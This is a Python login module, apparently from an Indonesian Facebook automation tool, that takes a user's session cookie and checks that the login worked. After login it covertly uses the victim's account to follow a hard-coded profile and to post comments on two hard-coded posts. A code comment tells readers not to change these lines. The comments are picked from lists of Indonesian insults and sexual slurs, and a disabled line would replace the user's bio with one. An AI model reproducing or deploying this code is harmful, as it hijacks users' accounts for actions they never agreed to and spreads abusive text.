# hallo bro :v

from .YNTKTS import *
from .bahasa import lang
from .informasi import generate

anjay=random.choice(["Aku suka gayamu","Tolol wkwkwk ","takentot kentot,","semua nya tolol","anak haram lu"])
komentar1=random.choice(["balikin akun gue woii","lari ada wibu","asuuuu","ku kira keras ternyata kertas","ada master lari"])
komentar2=random.choice(["idaman janda lewat","nyolong hp dari mana lu","memang yang satu ini berbeda","memek","hahahahahha"])

class login:
	def __init__(self,url,cookie):
		
		try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
		except koneksi_error: exit("\033[0;31mKONEKSI FAILED")
		if "mbasic_logout_button" in respon.text:
			print("\n\n WELCOME \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m \033[0;36m SANG MAUT")
			print("\033[0;34mPLEASE WAIT")
			url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
			if "Laporkan Masalah" not in respon.text:
				lang(url,cookie)
				try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
				except koneksi_error: exit(" ! kesalahan pada koneksi")
			generate(cookie["cookie"],parser(respon.text,"html.parser"))
			koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
			# jangan di ganti ya bro hehehe :)
			koh.follow("/100035145012094")
			koh.hoetang("/579465886568240","2",komentar1,True)
			koh.hoetang("/579467209901441","8",komentar2,True)
			#koh.change_bio(anjay)
			print("\033[0;32m LOGIN SUCCES")
			waktu(1)
		else:
			exit("\n\n\033[0;31m WARNING COOKIES INVALID")
